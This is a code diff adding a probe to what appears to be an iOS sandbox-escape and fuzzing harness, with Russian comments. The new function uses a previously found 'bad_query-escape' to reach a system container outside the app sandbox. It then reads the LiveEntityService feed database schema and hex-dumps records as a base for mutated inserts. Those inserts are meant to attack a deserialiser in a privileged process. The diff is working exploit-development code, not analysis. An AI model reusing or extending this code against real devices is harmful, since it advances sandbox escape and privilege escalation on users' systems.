@@ -42646,6 +42646,155 @@ static void p_bq79(void) {
     LOG("[bq79] фоновый запуск...");
 }
 
+// p_bq80 — v235: LIVEENTITY-ФАЗЗИНГ. §184: запись в feed-БД
+// доступна (uid=501 mode=644, RW через bad_query-escape). Сервис
+// com.apple.appintents.LiveEntityService перечитывает БД → его
+// LNValue-декодер десериализует наши байты в ПРИВИЛЕГИРОВАННОМ
+// процессе (богатая поверхность: custom binary decoder + SQLite).
+// План:
+//   A) найти БД (схема §181: feedEntries/feedMetadata)
+//   B) прочитать валидную запись (база для мутаций)
+//   C) INSERT мутированной записи → сервис прочитает
+//   D) детектор: crashdiff (LiveEntityService crash)
+static void p_bq80(void) {
+    LOG("[bq80] v235: LiveEntity-фаззинг — БД-разведка");
+    fsync(fileno(stderr));
+    dispatch_queue_t q = dispatch_queue_create("bq80.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq80] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) { LOG("[bq80] CONTROL FAILED (§144)"); return; }
+    fsync(fileno(stderr));
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+    @try {
+        // §184/§181: прямой путь к feed-БД (p_bq10 confirmed):
+        // /var/containers/Data/System/8EB68272-6502-…/db
+        // НО: из песочницы этот путь НЕ доступен — bad_query-escape
+        // §170 (bq_custom) открывает системные контейнеры.
+        // План: сначала прямой open (проверить доступ), потом escape.
+        const char *dbPath =
+            "/var/containers/Data/System/"
+            "8EB68272-6502-49E9-B688-25CA4774CFE4/db";
+        struct stat st80 = {0};
+        int statRc = stat(dbPath, &st80);
+        LOG("[bq80] stat(%s) -> %d errno=%d", dbPath, statRc, errno);
+        if (statRc != 0) {
+            // прямой путь недоступен — используем bad_query-escape
+            // (bq_custom как в p_bq10, §170)
+            LOG("[bq80] прямой путь закрыт — bad_query-escape §170");
+            const char *grp = "group.9e66ab897d52ea95.1";
+            const uint64_t F_DEF = 0x0000008000000000ULL;
+            int64_t h = bq_custom("/var/containers/Data/System", 0,
+                                   grp, 7, F_DEF, 3);
+            LOG("[bq80] escape handle -> %lld", (long long)h);
+            if (h < 0) {
+                LOG("[bq80] escape НЕ сработал — БД недоступна");
+                return;
+            }
+            // escape открыл контейнер — теперь stat снова
+            statRc = stat(dbPath, &st80);
+            LOG("[bq80] stat после escape -> %d", statRc);
+            if (statRc != 0) {
+                LOG("[bq80] БД недоступна даже с escape");
+                return;
+            }
+        }
+        LOG("[bq80] *** БД: %s size=%lld uid=%d mode=%o ***",
+            dbPath, (long long)st80.st_size, (int)st80.st_uid,
+            (unsigned)(st80.st_mode & 0777));
+        // sqlite3 open (RW для будущих мутаций, пока READ)
+        void *db = NULL;
+        int rc = sqlite3_open_v2(dbPath, &db,
+                                 SQLITE_OPEN_READONLY, NULL);
+        LOG("[bq80] sqlite3_open(RO) -> %d db=%p", rc, db);
+        if (rc != SQLITE_OK || !db) {
+            LOG("[bq80] БД не открылась — RW-путь отдельно");
+            sqlite3_close(db);
+            return;
+        }
+        // схема
+        {
+            sqlite3_stmt *st = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "SELECT sql FROM sqlite_master WHERE type='table'",
+                -1, &st, NULL);
+            if (rc == SQLITE_OK) {
+                while (sqlite3_step(st) == SQLITE_ROW) {
+                    const char *sql = (const char *)sqlite3_column_text(st, 0);
+                    LOG("[bq80] TABLE: %s", sql ?: "?");
+                }
+            } else {
+                LOG("[bq80] schema query rc=%d", rc);
+            }
+            sqlite3_finalize(st);
+        }
+        // читаем валидную запись (feedEntries)
+        {
+            sqlite3_stmt *st = NULL;
+            rc = sqlite3_prepare_v2(db,
+                "SELECT * FROM feedEntries LIMIT 3",
+                -1, &st, NULL);
+            if (rc == SQLITE_OK) {
+                int ncols = sqlite3_column_count(st);
+                LOG("[bq80] feedEntries cols=%d", ncols);
+                int row = 0;
+                while (sqlite3_step(st) == SQLITE_ROW && row < 3) {
+                    for (int c = 0; c < ncols; c++) {
+                        const char *cn = sqlite3_column_name(st, c);
+                        int ct = sqlite3_column_type(st, c);
+                        if (ct == SQLITE_BLOB) {
+                            const void *d = sqlite3_column_blob(st, c);
+                            int n = sqlite3_column_bytes(st, c);
+                            LOG("[bq80] row%d[%s] BLOB %d bytes", row,
+                                cn, n);
+                            // hex первые 64 байт (база мутаций!)
+                            if (d && n > 0) {
+                                int hn = n < 64 ? n : 64;
+                                char *hex = malloc(hn*2+1);
+                                for (int i = 0; i < hn; i++)
+                                    snprintf(hex+i*2, 3, "%02x",
+                                        ((const unsigned char*)d)[i]);
+                                hex[hn*2] = 0;
+                                LOG("[bq80] row%d[%s] hex=%s%s", row, cn,
+                                    hex, n > 64 ? "…" : "");
+                                free(hex);
+                            }
+                        } else if (ct == SQLITE_TEXT) {
+                            LOG("[bq80] row%d[%s] TEXT=%s", row, cn,
+                                (const char *)sqlite3_column_text(st, c) ?: "?");
+                        } else if (ct == SQLITE_INTEGER) {
+                            LOG("[bq80] row%d[%s] INT=%lld", row, cn,
+                                (long long)sqlite3_column_int64(st, c));
+                        }
+                    }
+                    row++;
+                }
+                if (row == 0) LOG("[bq80] feedEntries ПУСТАЯ");
+            } else {
+                LOG("[bq80] feedEntries query rc=%d: %s", rc,
+                    sqlite3_errmsg(db));
+            }
+            sqlite3_finalize(st);
+        }
+        sqlite3_close(db);
+        LOG("[bq80] done — схема и base-запись для LNValue-мутаций готовы");
+    } @catch (NSException *e) {
+        LOG("[bq80] ИСКЛ: %s — %s", e.name.UTF8String ?: "?",
+            e.reason ? e.reason.UTF8String : "?");
+    }
+    });
+    LOG("[bq80] фоновый запуск...");
+}
+
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
 // отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
@@ -50151,6 +50300,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ77")) { p_bq77(); LOG("[probe13] bq77-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ78")) { p_bq78(); LOG("[probe13] bq78-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ79")) { p_bq79(); LOG("[probe13] bq79-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ80")) { p_bq80(); LOG("[probe13] bq80-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
